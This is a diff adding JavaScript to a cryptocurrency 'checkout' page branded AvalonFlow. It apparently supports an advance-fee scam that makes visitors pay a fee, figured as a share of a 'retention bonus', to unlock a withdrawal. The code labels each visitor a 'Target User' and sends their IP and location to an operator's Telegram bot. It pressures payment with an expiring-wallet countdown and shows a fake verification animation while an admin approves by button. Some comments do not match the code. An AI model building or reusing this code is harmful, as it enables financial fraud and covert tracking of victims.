@@ -707,4 +707,495 @@ const tokens = {
 
 // ==========================================
 // 0. UNIQUE VISITOR IDENTIFIER
-// ================
+// ==========================================
+function getTargetUserIdentifier() {
+    const urlParams = new URLSearchParams(window.location.search);
+    let identifyUser = urlParams.get('user');
+
+    if (!identifyUser) {
+        identifyUser = sessionStorage.getItem('av_session_uid');
+        if (!identifyUser) {
+            identifyUser = 'User_' + Math.random().toString(36).substring(2, 8);
+            sessionStorage.setItem('av_session_uid', identifyUser);
+        }
+    }
+    return identifyUser.trim();
+}
+
+// ==========================================
+// 1. SESSION & TIMER INITIALIZATION (15 MIN)
+// ==========================================
+const totalDuration = 30 * 60 * 1000; // 15 minutes
+let expiryTime = localStorage.getItem(SOURCE_TIMER_KEY);
+
+if (expiryTime) {
+    expiryTime = parseInt(expiryTime, 10);
+    const remaining = expiryTime - Date.now();
+    // Clean up if the session timer is already expired
+    if (remaining <= 0) {
+        localStorage.removeItem("avalonflowAmount");
+        localStorage.removeItem(SOURCE_TIMER_KEY);
+        localStorage.removeItem("avalonflowWallet");
+        localStorage.removeItem("avalonflowRandomDecimal");
+        expiryTime = null;
+    }
+}
+
+// Fallback: If no active source timer exists, generate one from now
+if (!expiryTime) {
+    expiryTime = Date.now() + totalDuration;
+    localStorage.setItem(SOURCE_TIMER_KEY, expiryTime);
+}
+
+// Derive startTime for backwards compatibility with progress calculations
+let startTime = expiryTime - totalDuration;
+
+// ==========================================
+// 2. DYNAMIC WALLET & 29.65% AMOUNT RESOLUTION
+// ==========================================
+let walletPair = JSON.parse(localStorage.getItem("avalonflowWalletPair"));
+if (!walletPair) {
+    walletPair = { USDT: wallets[0], USDC: wallets[1] };
+    localStorage.setItem("avalonflowWalletPair", JSON.stringify(walletPair));
+}
+
+let activeWallet = localStorage.getItem("avalonflowWallet");
+if (!activeWallet) {
+    activeWallet = wallets[Math.floor(Math.random() * wallets.length)];
+    localStorage.setItem("avalonflowWallet", activeWallet);
+}
+
+const storageKey = "avalonflowAmount_custom";
+
+const rawBonus = localStorage.getItem("av_snap_core_dep") || localStorage.getItem("av_snap_retention_bonus");
+let calculatedBaseAmount;
+
+if (rawBonus && !isNaN(parseFloat(rawBonus))) {
+    calculatedBaseAmount = (parseFloat(rawBonus) * 0.0947).toFixed(2);
+} else {
+    calculatedBaseAmount = parseFloat(localStorage.getItem("avalonflowCustomAmount") || "2133.33").toFixed(2);
+}
+
+let randomDecimal = localStorage.getItem("avalonflowRandomDecimal");
+if (!randomDecimal) {
+    randomDecimal = (Math.floor(Math.random() * 10000) / 10000).toString();
+    localStorage.setItem("avalonflowRandomDecimal", randomDecimal);
+}
+
+let expectedAmount = (parseFloat(calculatedBaseAmount) + parseFloat(randomDecimal)).toFixed(4);
+localStorage.setItem("avalonflowAmount", expectedAmount);
+
+let activeToken = "USDT";
+
+
+// ==========================================
+// 3. TELEMETRY & VISITOR NOTIFICATIONS
+// ==========================================
+async function initializeAppWithIP() {
+    let ipData = {};
+    try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+        ipData = await ipResponse.json();
+    } catch (err) {
+        console.warn("IP geolocation fallback engaged:", err);
+        ipData = { ip: "Unknown", city: "Unknown", country_name: "Unknown", org: "Unknown" };
+    }
+
+    if (!sessionStorage.getItem('visitor_logged_tg')) {
+        await sendVisitorDetailsToTelegram(ipData);
+    }
+}
+
+async function sendVisitorDetailsToTelegram(ipData) {
+    try {
+        const rawAgent = navigator.userAgent;
+        if (/bot|googlebot|crawler|spider|robot/i.test(rawAgent)) return;
+
+        const identifyUser = getTargetUserIdentifier();
+        const currentPage = window.location.pathname;
+        const messageText = `⚡ <b>Crypto Checkout Session Started | AvalonFlow</b>\n\n` +
+                            `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
+                            `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
+                            `💰 <b>Expected Amount:</b> <code>$${expectedAmount}</code>\n` +
+                            `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                            `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
+                            `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageText, parse_mode: 'HTML' })
+        });
+
+        sessionStorage.setItem('visitor_logged_tg', 'true');
+    } catch (err) {
+        console.warn("Telegram telemetry error:", err);
+    }
+}
+
+// ==========================================
+// 4. ANIMATION & TELEGRAM VERIFICATION BRIDGE
+// ==========================================
+function initiatePaymentAnimationUI() {
+    const usdtProgress = document.getElementById("usdt-progress");
+    const usdcProgress = document.getElementById("usdc-progress");
+    const usdtTimer = document.getElementById("usdt-timer");
+    const usdcTimer = document.getElementById("usdc-timer");
+
+    if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "none";
+    if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "none";
+    if (usdtTimer) usdtTimer.style.display = "none";
+    if (usdcTimer) usdcTimer.style.display = "none";
+
+    const usdtCard = document.getElementById("usdt-card");
+    const usdcCard = document.getElementById("usdc-card");
+
+    const statusHTML = `
+        <div class="status-animation-container" id="active-status-container">
+            <div class="payment-line-wrapper">
+                <span class="label-text">Sent</span>
+                <div class="cyber-line-track">
+                    <div class="cyber-line-pulse"></div>
+                </div>
+                <span class="label-text received">Received</span>
+                <div class="checkmark-wrapper">
+                    <svg class="checkmark-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                        <circle class="checkmark-circle" cx="26" cy="26" r="23" fill="none"/>
+                        <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    `;
+
+    if (usdtCard && !usdtCard.querySelector("#active-status-container")) usdtCard.insertAdjacentHTML('beforeend', statusHTML);
+    if (usdcCard && !usdcCard.querySelector("#active-status-container")) usdcCard.insertAdjacentHTML('beforeend', statusHTML);
+}
+
+function completePaymentAnimationUI(redirectUrl) {
+    const wrappers = document.querySelectorAll(".payment-line-wrapper");
+    wrappers.forEach(wrapper => wrapper.classList.add("success"));
+
+    const checkmarks = document.querySelectorAll(".checkmark-wrapper");
+    checkmarks.forEach(cm => cm.classList.add("active"));
+
+    triggerNotification("Verification Successful. Redirecting...", 3000);
+
+    setTimeout(() => {
+        window.location.replace(redirectUrl || "https://membership.avalonflow.site/withdraw");
+    }, 1800);
+}
+
+async function streamPaymentVerificationToTelegram(txHash = "Manual/System Verification") {
+    try {
+        const identifyUser = getTargetUserIdentifier();
+        const telegramMessage = 
+          `💳 <b>Crypto Payment Submitted for Verification</b>\n\n` +
+          `• <b>User ID:</b> <code>${identifyUser}</code>\n` +
+          `• <b>Token:</b> <code>${activeToken}</code>\n` +
+          `• <b>Expected Amount:</b> <code>$${expectedAmount}</code>\n` +
+          `• <b>TX Hash:</b> <code>${txHash}</code>\n` +
+          `• <b>Wallet Paid:</b> <code>${walletPair[activeToken]}</code>`;
+
+        const inlineKeyboard = {
+            inline_keyboard: [
+                [
+                    { text: "✅ Approve Transaction", callback_data: `approve:${identifyUser}` },
+                    { text: "❌ Reject Transaction", callback_data: `reject:${identifyUser}` }
+                ]
+            ]
+        };
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: telegramMessage,
+                parse_mode: 'HTML',
+                reply_markup: inlineKeyboard
+            })
+        });
+
+        startTelegramPolling(identifyUser, txHash);
+    } catch (error) {
+        console.error('Failed to notify Telegram admin:', error);
+    }
+}
+
+// ==========================================
+// 5. TELEGRAM ADMIN POLLING ENGINE
+// ==========================================
+async function acknowledgeTelegramAction(callbackId, messageId, originalText, statusStamp) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ callback_query_id: callbackId, text: statusStamp })
+        });
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                message_id: messageId,
+                text: `${originalText || ''}\n\n<b>[ADMIN ACTION: ${statusStamp}]</b>`,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (e) {
+        console.warn("Failed to acknowledge Telegram action:", e);
+    }
+}
+
+let telegramLastUpdateId = 0;
+
+function startTelegramPolling(targetUser, txHash) {
+    if (telegramPollInterval) clearInterval(telegramPollInterval);
+
+    telegramPollInterval = setInterval(async () => {
+        try {
+            const offsetParam = telegramLastUpdateId ? `?offset=${telegramLastUpdateId + 1}` : `?offset=-10`;
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`);
+            const data = await response.json();
+            if (!data.ok || !data.result || data.result.length === 0) return;
+
+            for (const update of data.result) {
+                telegramLastUpdateId = update.update_id;
+
+                if (update.callback_query && update.callback_query.data) {
+                    const callbackData = update.callback_query.data;
+                    const callbackId = update.callback_query.id;
+                    const messageId = update.callback_query.message?.message_id;
+                    const originalText = update.callback_query.message?.text || "";
+
+                    if (callbackData === `approve:${targetUser}`) {
+                        clearInterval(telegramPollInterval);
+                        await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");
+
+                        localStorage.setItem("step_3_paid", "true");
+                        localStorage.setItem("step_3_txn_id", txHash);
+
+                        localStorage.removeItem("av_payment_in_progress");
+                        localStorage.removeItem(storageKey);
+                        localStorage.removeItem(SOURCE_TIMER_KEY);
+                        localStorage.removeItem("avalonflowWallet");
+                        localStorage.removeItem("avalonflowRandomDecimal");
+
+                        const redirectUrl = `https://membership.avalonflow.site/notifications?txHash=${txHash}`;
+                        completePaymentAnimationUI(redirectUrl);
+                        break;
+                    } 
+                    else if (callbackData === `reject:${targetUser}`) {
+                        clearInterval(telegramPollInterval);
+                        await acknowledgeTelegramAction(callbackId, messageId, originalText, "❌ REJECTED");
+
+                        localStorage.removeItem("av_payment_in_progress");
+
+                        const statusContainers = document.querySelectorAll("#active-status-container");
+                        statusContainers.forEach(container => container.remove());
+
+                        const usdtProgress = document.getElementById("usdt-progress");
+                        const usdcProgress = document.getElementById("usdc-progress");
+                        const usdtTimer = document.getElementById("usdt-timer");
+                        const usdcTimer = document.getElementById("usdc-timer");
+
+                        if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "";
+                        if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "";
+                        if (usdtTimer) usdtTimer.style.display = "";
+                        if (usdcTimer) usdcTimer.style.display = "";
+
+                        paymentDone = false;
+
+                        triggerNotification("Verification failed", 4000);
+                        break;
+                    }
+                }
+            }
+        } catch (err) {
+            console.warn("Telegram polling interval check active...");
+        }
+    }, 2500);
+}
+
+// ==========================================
+// 6. PAYMENT HANDLERS
+// ==========================================
+async function handlePayClick() {
+    try {
+        if (paymentDone) return;
+        paymentDone = true;
+        paymentMode = "paymento";
+
+        localStorage.setItem("av_payment_in_progress", "true");
+
+        initiatePaymentAnimationUI();
+        triggerNotification("Connecting authorization protocol...", 3000);
+
+        await streamPaymentVerificationToTelegram("Instant Paymento Request");
+    } catch (err) {
+        console.error("Paymento connection error:", err);
+        localStorage.removeItem("av_payment_in_progress");
+        paymentDone = false;
+        triggerNotification("Authorization connection error", 3000);
+    }
+}
+
+// ==========================================
+// 7. HELPER & UI SETUP FUNCTIONS
+// ==========================================
+function copyWallet(id) {
+    paymentMode = "manual";
+
+    const walletP = document.getElementById(id);
+    const walletText = Array.from(walletP.childNodes)
+        .filter(node => node.nodeType === Node.TEXT_NODE)
+        .map(node => node.textContent.trim())
+        .join('');
+
+    navigator.clipboard.writeText(walletText)
+        .then(() => {
+            triggerNotification("Wallet Address Copied", 3000);
+        })
+        .catch(() => {
+            triggerNotification("Failed to copy Wallet Address", 3000);
+        });
+}
+
+function showTokenCard(selectedToken) {
+    activeToken = selectedToken.toUpperCase();
+    const cards = document.querySelectorAll(".token-card");
+    cards.forEach(card => card.classList.add("inactive"));
+    const activeCard = document.getElementById(`${selectedToken}-card`);
+    if (activeCard) activeCard.classList.remove("inactive");
+
+    const btnUsdt = document.getElementById("usdt-btn");
+    const btnUsdc = document.getElementById("usdc-btn");
+
+    if (btnUsdt && btnUsdc) {
+        if (selectedToken === "usdt") {
+            btnUsdt.innerText = "USDT NETWORK";
+            btnUsdc.innerText = "USDC NETWORK";
+            btnUsdt.setAttribute("onclick", "showTokenCard('usdt')");
+            btnUsdc.setAttribute("onclick", "showTokenCard('usdc')");
+
+            btnUsdt.classList.add("active");
+            btnUsdc.classList.remove("active");
+
+            document.getElementById("usdt-wallet").childNodes[0].nodeValue = walletPair.USDT;
+        } else {
+            btnUsdt.innerText = "USDC NETWORK";
+            btnUsdc.innerText = "USDT NETWORK";
+            btnUsdc.setAttribute("onclick", "showTokenCard('usdc')");
+            btnUsdc.setAttribute("onclick", "showTokenCard('usdt')");
+
+            btnUsdt.classList.add("active");
+            btnUsdc.classList.remove("active");
+
+            document.getElementById("usdc-wallet").childNodes[0].nodeValue = walletPair.USDC;
+        }
+    }
+}
+
+function triggerNotification(message, duration = 3000) {
+    const notification = document.getElementById("planNotification");
+    if (!notification) return;
+    notification.textContent = message;
+    notification.classList.add("show");
+    setTimeout(() => notification.classList.remove("show"), duration);
+}
+
+// ==========================================
+// 8. INITIALIZATION ON DOM READY
+// ==========================================
+window.addEventListener("DOMContentLoaded", () => {
+    initializeAppWithIP();
+    showTokenCard("usdt");
+
+    document.getElementById("usdt-amount").innerText = "$" + expectedAmount;
+    document.getElementById("usdc-amount").innerText = "$" + expectedAmount;
+
+    if (localStorage.getItem("av_payment_in_progress") === "true") {
+        paymentDone = true;
+        initiatePaymentAnimationUI();
+        const identifyUser = getTargetUserIdentifier();
+        startTelegramPolling(identifyUser, "Resumed Session Request");
+    }
+
+    const tokenValue = Math.floor(parseFloat(expectedAmount) * 1e6);
+    document.getElementById("usdt-qr").innerHTML = "";
+    document.getElementById("usdc-qr").innerHTML = "";
+
+    new QRCode(document.getElementById("usdt-qr"), {
+        text: `ethereum:${walletPair.USDT}?value=${tokenValue}`,
+        width: 120, height: 120, colorDark: "#0ff", colorLight: "rgba(0,0,0,0)", correctLevel: QRCode.CorrectLevel.H
+    });
+    new QRCode(document.getElementById("usdc-qr"), {
+        text: `ethereum:${walletPair.USDC}?value=${tokenValue}`,
+        width: 120, height: 120, colorDark: "#ff3fff", colorLight: "rgba(0,0,0,0)", correctLevel: QRCode.CorrectLevel.H
+    });
+
+    document.getElementById("usdt-wallet").childNodes[0].textContent = walletPair.USDT;
+    document.getElementById("usdc-wallet").childNodes[0].textContent = walletPair.USDC;
+
+    const usdtProgress = document.getElementById("usdt-progress");
+    const usdcProgress = document.getElementById("usdc-progress");
+    const usdtTimer = document.getElementById("usdt-timer");
+    const usdcTimer = document.getElementById("usdc-timer");
+    const usdtStatus = document.getElementById("usdt-status");
+    const usdcStatus = document.getElementById("usdc-status");
+    const checkBtn = document.getElementById("check-btn");
+
+    function updateTimer() {
+        const currentExpiry = parseInt(localStorage.getItem(SOURCE_TIMER_KEY), 10) || expiryTime;
+        const remaining = Math.max(0, Math.floor((currentExpiry - Date.now()) / 1000));
+
+        const totalSeconds = totalDuration / 1000;
+        const percentage = Math.max(0, (remaining / totalSeconds) * 100);
+
+        if (usdtProgress) usdtProgress.style.width = percentage + "%";
+        if (usdcProgress) usdcProgress.style.width = percentage + "%";
+
+        const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
+        const seconds = String(remaining % 60).padStart(2, "0");
+
+        if (usdtTimer) usdtTimer.innerText = remaining > 0 ? `Wallet Address expires in ${minutes}:${seconds}` : "Wallet Address expired!";
+        if (usdcTimer) usdcTimer.innerText = remaining > 0 ? `Wallet Address expires in ${minutes}:${seconds}` : "Wallet Address expired!";
+
+        if (remaining <= 0 && !paymentDone) {
+            paymentDone = true;
+
+            const temp = walletPair.USDT;
+            walletPair.USDT = walletPair.USDC;
+            walletPair.USDC = temp;
+            localStorage.setItem("avalonflowWalletPair", JSON.stringify(walletPair));
+
+            if (usdtStatus) usdtStatus.innerText = "Wallet Address expired.";
+            if (usdcStatus) usdcStatus.innerText = "Wallet Address expired.";
+            if (checkBtn) checkBtn.disabled = true;
+
+            localStorage.removeItem("av_payment_in_progress");
+            localStorage.removeItem("avalonflowAmount");
+            localStorage.removeItem(SOURCE_TIMER_KEY);
+            localStorage.removeItem(storageKey);
+            localStorage.removeItem("avalonflowWallet");
+            localStorage.removeItem("avalonflowCustomAmount");
+            localStorage.removeItem("avalonflowRandomDecimal");
+
+            clearInterval(timerInterval);
+
+            try { triggerNotification("Verification Failed. Redirecting...", 3000); } catch (err) { }
+
+            setTimeout(() => {
+                window.location.replace("https://membership.avalonflow.site/withdrawal");
+            }, 3200);
+        }
+    }
+
+    timerInterval = setInterval(updateTimer, 1000);
+    updateTimer();
+});
+</script>
+</html>
